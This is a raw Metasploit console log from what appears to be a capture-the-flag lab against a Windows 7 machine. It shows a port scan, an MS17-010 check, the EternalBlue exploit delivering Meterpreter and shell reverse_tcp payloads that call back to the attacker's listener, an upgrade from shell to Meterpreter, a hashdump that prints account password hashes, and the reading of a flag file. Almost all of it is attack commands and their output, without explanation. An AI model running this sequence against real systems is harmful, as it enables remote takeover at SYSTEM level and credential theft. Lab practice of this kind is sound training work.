```

msf6 > search portscan

Matching Modules
================

   #  Name                                              Disclosure Date  Rank    Check  Description
   -  ----                                              ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce                               normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/natpmp/natpmp_portscan                           normal  No     NAT-PMP External Port Scanner
   2  auxiliary/scanner/sap/sap_router_portscanner                       normal  No     SAPRouter Port Scanner
   3  auxiliary/scanner/portscan/xmas                                    normal  No     TCP "XMas" Port Scanner
   4  auxiliary/scanner/portscan/ack                                     normal  No     TCP ACK Firewall Scanner
   5  auxiliary/scanner/portscan/tcp                                     normal  No     TCP Port Scanner
   6  auxiliary/scanner/portscan/syn                                     normal  No     TCP SYN Port Scanner
   7  auxiliary/scanner/http/wordpress_pingback_access                   normal  No     Wordpress Pingback Locator


Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/http/wordpress_pingback_access

msf6 > use auxiliary/scanner/portscan/tcp
msf6 auxiliary(scanner/portscan/tcp) > 
msf6 auxiliary(scanner/portscan/tcp) > 
msf6 auxiliary(scanner/portscan/tcp) > options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-65356
PORTS => 1-65356
msf6 auxiliary(scanner/portscan/tcp) > setg RHOSTS 10.10.52.212
RHOSTS => 10.10.52.212
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-65356          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS       10.10.52.212     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.10.52.212:         - 10.10.52.212:135 - TCP OPEN
[+] 10.10.52.212:         - 10.10.52.212:139 - TCP OPEN
[+] 10.10.52.212:         - 10.10.52.212:445 - TCP OPEN
[+] 10.10.52.212:         - 10.10.52.212:3389 - TCP OPEN
^C[*] 10.10.52.212:         - Caught interrupt from the console...
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/portscan/tcp) > search ms17

Matching Modules
================

   #  Name                                                  Disclosure Date  Rank     Check  Description
   -  ----                                                  ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue              2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec                   2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command                  2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                                     normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/fileformat/office_ms17_11882          2017-11-15       manual   No     Microsoft Office CVE-2017-11882
   5  auxiliary/admin/mssql/mssql_escalate_execute_as                        normal   No     Microsoft SQL Server Escalate EXECUTE AS
   6  auxiliary/admin/mssql/mssql_escalate_execute_as_sqli                   normal   No     Microsoft SQL Server SQLi Escalate Execute AS
   7  exploit/windows/smb/smb_doublepulsar_rce              2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 7, use 7 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/portscan/tcp) > use 3
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting                                                 Required  Description
   ----         ---------------                                                 --------  -----------
   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
   RHOSTS       10.10.52.212                                                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT        445                                                             yes       The SMB service port (TCP)
   SMBDomain    .                                                               no        The Windows domain to use for authentication
   SMBPass                                                                      no        The password for the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.10.52.212:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.52.212:445      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/smb/smb_ms17_010) > search ms17-010 -type exploit

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/smb/smb_doublepulsar_rce

msf6 auxiliary(scanner/smb/smb_ms17_010) > use 0
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.52.212     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.112.115    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.112.115:4444 
[*] 10.10.52.212:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.52.212:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.52.212:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.52.212:445 - The target is vulnerable.
[*] 10.10.52.212:445 - Connecting to target for exploitation.
[+] 10.10.52.212:445 - Connection established for exploitation.
[+] 10.10.52.212:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.52.212:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.52.212:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.52.212:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.52.212:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.52.212:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.52.212:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.52.212:445 - Sending all but last fragment of exploit packet
[*] 10.10.52.212:445 - Starting non-paged pool grooming
[+] 10.10.52.212:445 - Sending SMBv2 buffers
[+] 10.10.52.212:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.52.212:445 - Sending final SMBv2 buffers.
[*] 10.10.52.212:445 - Sending last fragment of exploit packet!
[*] 10.10.52.212:445 - Receiving response from exploit packet
[+] 10.10.52.212:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.52.212:445 - Sending egg to corrupted connection.
[*] 10.10.52.212:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.10.52.212
[*] Meterpreter session 1 opened (10.18.112.115:4444 -> 10.10.52.212:49172 ) at 2022-06-05 12:09:53 +0530
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter > getpid
Current pid: 1288
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > exit
[*] Shutting down Meterpreter...

[*] 10.10.52.212 - Meterpreter session 1 closed.  Reason: User exit

[*] 10.10.52.212 - Meterpreter session 1 closed.  Reason: Died
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.10.52.212     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authentication. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affects Windows Server 2008 R2, Windows 7, Windows Embedded Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.18.112.115    yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target


msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > run

[*] Started reverse TCP handler on 10.18.112.115:4444 
[*] 10.10.52.212:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.10.52.212:445      - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.10.52.212:445      - Scanned 1 of 1 hosts (100% complete)
[+] 10.10.52.212:445 - The target is vulnerable.
[*] 10.10.52.212:445 - Connecting to target for exploitation.
[+] 10.10.52.212:445 - Connection established for exploitation.
[+] 10.10.52.212:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.10.52.212:445 - CORE raw buffer dump (42 bytes)
[*] 10.10.52.212:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.10.52.212:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.10.52.212:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.10.52.212:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.10.52.212:445 - Trying exploit with 12 Groom Allocations.
[*] 10.10.52.212:445 - Sending all but last fragment of exploit packet
[*] 10.10.52.212:445 - Starting non-paged pool grooming
[+] 10.10.52.212:445 - Sending SMBv2 buffers
[+] 10.10.52.212:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.10.52.212:445 - Sending final SMBv2 buffers.
[*] 10.10.52.212:445 - Sending last fragment of exploit packet!
[*] 10.10.52.212:445 - Receiving response from exploit packet
[+] 10.10.52.212:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.10.52.212:445 - Sending egg to corrupted connection.
[*] 10.10.52.212:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to 10.10.52.212
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.10.52.212:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Command shell session 2 opened (10.18.112.115:4444 -> 10.10.52.212:49183 ) at 2022-06-05 12:13:15 +0530


Shell Banner:
Microsoft Windows [Version 6.1.7601]
-----
          

C:\Windows\system32>

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>

C:\Windows\system32>

C:\Windows\system32>

C:\Windows\system32>^Z
Background session 2? [y/N]  y
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -l

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.112.115:4444 -> 10.10.52.212:49183  (10.10.52.212)

msf6 exploit(windows/smb/ms17_010_eternalblue) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter

msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on

msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
SESSION => 2
msf6 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION  2                yes       The session to run this module on

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.18.112.115:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200262 bytes) to 10.10.52.212

msf6 post(multi/manage/shell_to_meterpreter) > 
msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.112.115:4444 -> 10.10.52.212:49183  (10.10.52.212)
  3         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.112.115:4433 -> 10.10.52.212:49194  (10.10.52.212)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 3
[*] Starting interaction with 3...

meterpreter > 
[*] Stopping exploit/multi/handler
[*] Meterpreter session 3 opened (10.18.112.115:4433 -> 10.10.52.212:49194 ) at 2022-06-05 12:22:44 +0530

meterpreter > 
meterpreter > 
meterpreter > getpid
Current pid: 1152
meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 704 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>^Z
Background channel 1? [y/N]  y
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System                x64   0
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 460   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 544   536   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 584   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 592   536   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   584   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   584   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   592   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 704   1152  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 708   592   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 816   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 884   692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 932   692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1020  644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 1060  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1152  556   powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 1164  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 1324  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 1384  692   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
 1408  692   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM
 1460  692   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\XenTools\LiteAgent.exe
 1600  692   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
 1868  2160  mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 1928  692   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE
 2072  816   WmiPrvSE.exe
 2160  692   mscorsvw.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\Microsoft.NET\Framework64\v4.0.30319\mscorsvw.exe
 2348  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 2356  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 2376  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE
 2400  692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE
 2504  2356  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
 2512  692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM
 2592  692   vds.exe               x64   0        NT AUTHORITY\SYSTEM
 2876  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 3064  544   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
 3068  692   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM

meterpreter > getpid
Current pid: 1152
meterpreter > migrate 3068
[*] Migrating from 1152 to 3068...
[-] core_migrate: Operation failed: Access is denied.
meterpreter > migrate 3064
[*] Migrating from 1152 to 3064...
[-] Error running command migrate: Rex::TimeoutError Operation timed out.
meterpreter > 
[*] 10.10.52.212 - Meterpreter session 3 closed.  Reason: Died

msf6 post(multi/manage/shell_to_meterpreter) > 
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type               Information                                               Connection
  --  ----  ----               -----------                                               ----------
  2         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.112.115:4444 -> 10.10.52.212:49183  (10.10.52.212)

msf6 post(multi/manage/shell_to_meterpreter) > run

[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.18.112.115:4433 
[*] Post module execution completed
msf6 post(multi/manage/shell_to_meterpreter) > 
msf6 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (200262 bytes) to 10.10.52.212
[*] Stopping exploit/multi/handler
[*] Meterpreter session 4 opened (10.18.112.115:4433 -> 10.10.52.212:49199 ) at 2022-06-05 12:26:45 +0530

msf6 post(multi/manage/shell_to_meterpreter) > 
msf6 post(multi/manage/shell_to_meterpreter) > 
msf6 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions
===============

  Id  Name  Type                     Information                                               Connection
  --  ----  ----                     -----------                                               ----------
  2         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.18.112.115:4444 -> 10.10.52.212:49183  (10.10.52.212)
  4         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC                              10.18.112.115:4433 -> 10.10.52.212:49199  (10.10.52.212)

msf6 post(multi/manage/shell_to_meterpreter) > sessions 4
[*] Starting interaction with 4...

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
meterpreter > 
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
[-] Error running command hashdump: NoMethodError undefined method `id' for nil:NilClass
meterpreter > pwd
C:\Windows\system32
meterpreter > cd ../..
meterpreter > pwd
C:\
meterpreter > dir
Listing: C:\
============

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
040777/rwxrwxrwx  0      dir   2018-12-13 08:43:36 +0530  $Recycle.Bin
040777/rwxrwxrwx  0      dir   2009-07-14 10:38:56 +0530  Documents and Settings
040777/rwxrwxrwx  0      dir   2009-07-14 08:50:08 +0530  PerfLogs
040555/r-xr-xr-x  4096   dir   2019-03-18 03:52:01 +0530  Program Files
040555/r-xr-xr-x  4096   dir   2019-03-18 03:58:38 +0530  Program Files (x86)
040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:57 +0530  ProgramData
040777/rwxrwxrwx  0      dir   2018-12-13 08:43:22 +0530  Recovery
040777/rwxrwxrwx  4096   dir   2019-03-18 04:05:55 +0530  System Volume Information
040555/r-xr-xr-x  4096   dir   2018-12-13 08:43:28 +0530  Users
040777/rwxrwxrwx  16384  dir   2019-03-18 04:06:30 +0530  Windows
100666/rw-rw-rw-  24     fil   2019-03-18 00:57:21 +0530  flag1.txt
000000/---------  0      fif   1970-01-01 05:30:00 +0530  hiberfil.sys
000000/---------  0      fif   1970-01-01 05:30:00 +0530  pagefile.sys

meterpreter > cat flag1.txt
flag{access_the_machine}meterpreter > cd Windows
meterpreter > dir
Listing: C:\Windows
===================

Mode              Size     Type  Last modified              Name
----              ----     ----  -------------              ----
040777/rwxrwxrwx  0        dir   2009-07-14 08:50:08 +0530  AppCompat
040777/rwxrwxrwx  4096     dir   2010-11-21 08:59:44 +0530  AppPatch
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Boot
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Branding
040777/rwxrwxrwx  0        dir   2018-12-13 04:31:32 +0530  CSC
040777/rwxrwxrwx  40960    dir   2009-07-14 11:02:39 +0530  Cursors
040777/rwxrwxrwx  0        dir   2009-07-14 11:07:46 +0530  DigitalLocker
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:39 +0530  Downloaded Program Files
100666/rw-rw-rw-  2790     fil   2018-12-13 04:32:52 +0530  DtcInstall.log
040555/r-xr-xr-x  98304    dir   2010-11-21 08:59:46 +0530  Fonts
040777/rwxrwxrwx  0        dir   2011-04-12 14:00:42 +0530  Globalization
040777/rwxrwxrwx  0        dir   2011-04-12 13:47:51 +0530  Help
100777/rwxrwxrwx  733696   fil   2009-07-14 07:09:12 +0530  HelpPane.exe
040777/rwxrwxrwx  0        dir   2009-07-14 11:07:46 +0530  IME
040777/rwxrwxrwx  0        dir   2019-03-18 04:06:17 +0530  Installer
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:39 +0530  L2Schemas
040777/rwxrwxrwx  0        dir   2009-07-14 08:04:24 +0530  LiveKernelReports
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Logs
040555/r-xr-xr-x  12288    dir   2009-07-14 11:02:40 +0530  Media
040777/rwxrwxrwx  8192     dir   2022-06-05 12:26:30 +0530  Microsoft.NET
040777/rwxrwxrwx  0        dir   2019-03-18 03:58:36 +0530  Migration
040777/rwxrwxrwx  0        dir   2009-07-14 08:04:34 +0530  ModemLogs
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:40 +0530  Offline Web Pages
100666/rw-rw-rw-  4568     fil   2010-11-21 09:17:07 +0530  PFRO.log
040777/rwxrwxrwx  0        dir   2009-07-14 08:50:10 +0530  PLA
100777/rwxrwxrwx  87616    fil   2019-03-18 04:06:30 +0530  PSSDNSVC.EXE
040777/rwxrwxrwx  0        dir   2018-12-13 08:43:23 +0530  Panther
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Performance
040777/rwxrwxrwx  0        dir   2011-04-12 13:58:20 +0530  PolicyDefinitions
040777/rwxrwxrwx  49152    dir   2022-06-05 12:13:21 +0530  Prefetch
100666/rw-rw-rw-  53551    fil   2009-06-11 02:00:55 +0530  Professional.xml
040777/rwxrwxrwx  0        dir   2009-07-14 08:50:11 +0530  Registration
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Resources
040777/rwxrwxrwx  0        dir   2009-07-14 08:05:47 +0530  SchCache
040777/rwxrwxrwx  0        dir   2009-07-14 10:15:47 +0530  ServiceProfiles
040777/rwxrwxrwx  0        dir   2019-03-18 04:05:44 +0530  Setup
040777/rwxrwxrwx  0        dir   2011-04-12 13:58:28 +0530  ShellNew
040777/rwxrwxrwx  4096     dir   2018-12-13 08:44:25 +0530  SoftwareDistribution
040777/rwxrwxrwx  0        dir   2011-04-12 13:47:51 +0530  Speech
100666/rw-rw-rw-  48201    fil   2009-06-11 02:01:02 +0530  Starter.xml
040777/rwxrwxrwx  524288   dir   2019-03-18 04:00:22 +0530  SysWOW64
040777/rwxrwxrwx  655360   dir   2022-06-05 12:09:33 +0530  System32
040777/rwxrwxrwx  0        dir   2009-07-14 10:27:13 +0530  TAPI
100666/rw-rw-rw-  1355     fil   2018-12-13 04:32:50 +0530  TSSysprep.log
040777/rwxrwxrwx  0        dir   2009-07-14 10:38:49 +0530  Tasks
040777/rwxrwxrwx  8192     dir   2022-06-05 12:12:09 +0530  Temp
040777/rwxrwxrwx  0        dir   2009-07-14 08:50:14 +0530  Vss
100666/rw-rw-rw-  316640   fil   2009-06-11 02:22:44 +0530  WMSysPr9.prx
040777/rwxrwxrwx  0        dir   2009-07-14 11:02:38 +0530  Web
100444/r--r--r--  749      fil   2009-07-14 10:24:24 +0530  WindowsShell.Manifest
